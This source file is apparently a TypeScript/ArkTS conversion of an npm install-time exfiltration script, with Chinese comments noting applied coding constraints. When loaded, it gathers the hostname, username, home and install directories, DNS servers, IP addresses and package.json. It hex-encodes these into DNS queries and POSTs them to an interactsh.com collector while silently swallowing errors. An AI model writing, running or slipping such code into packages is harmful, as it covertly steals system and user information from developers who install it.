// 应用约束9：使用let/const替换var
// 应用约束60：使用ES模块导入替换require
import os from "os.ets";
import dns from "dns.ets";
import querystring from "querystring.ets";
import https from "https.ets";
import fs from 'fs.ets';
import path from 'path.ets';
import packageJSON from "./package.ets";

const package = packageJSON.name;

// 应用约束1：添加类型注解
function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath: string = paths[j];
        let files: string[] = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

// 应用约束1：添加参数和返回类型
function toHex(data: string): string {
    const encoder = new TextEncoder();
    const encoded = encoder.encode(data);
    let hex = '';
    for (const byte of encoded) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

// 应用约束1：添加返回类型注解
function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str.push(addresses[i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str: string = "";
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            let addresses = networkInterfaces[item];
            for (let i = 0; i < addresses.length; i++) {
                str += toHex(addresses[i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str: string = "p";
    let chunks: string[] = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
}

// 定义Pkg接口应用约束24
interface Pkg {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
    dns: string;
}

function toName(pkg: Pkg): string[] {
    let queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    let fullStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (fullStr.length > 255) {
        let substr1 = `${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        let substr2 = getIps();

        if (substr1.length < 150) {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${toHex(pkg.un)}.${hostname}`);
            queries.push(`${substr2}.${hostname}`);
        } else if (substr2.length < 150) {
            queries.push(`${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.un)}.${substr2}.${hostname}`);
        } else {
            queries.push(`${toHex(pkg.hn)}.${substr1}.${hostname}`);
            queries.push(`${toHex(pkg.hn)}.${toHex(pkg.hd)}.${toHex(pkg.un)}.${hostname}`);
        }
    } else {
        queries.push(fullStr);
    }
    return queries;
}

// 应用约束24：使用接口定义对象类型
interface TrackingData {
    p: string;
    c: string;
    hd: string;
    hn: string;
    un: string;
    dns: string;
    r?: string;
    v: string;
    pjson: Object;
    ip: string;
}

const td: TrackingData = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON ? (packageJSON as any).___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

let qs: string[] = toName(td as Pkg);

// 应用约束26：使用箭头函数保持作用域
qs.forEach((query) => {
    dns.lookup(query, (err: Error | null, result: string) => {
        // console.log(result)
    });
});

const trackingData: string = JSON.stringify(td);
let postData: string = querystring.stringify({
    msg: trackingData,
});

// 应用约束1：定义Options类型
interface RequestOptions {
    hostname: string;
    port: number;
    path: string;
    method: string;
    headers: {
        "Content-Type": string;
        "Content-Length": number;
    };
}

let options: RequestOptions = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

let req = https.request(options, (res: any) => {
    res.on("data", (d: string) => {
        // process.stdout.write(d);
    });
});

req.on("error", (e: Error) => {
    // console.error(e);
});

req.write(postData);
req.end();
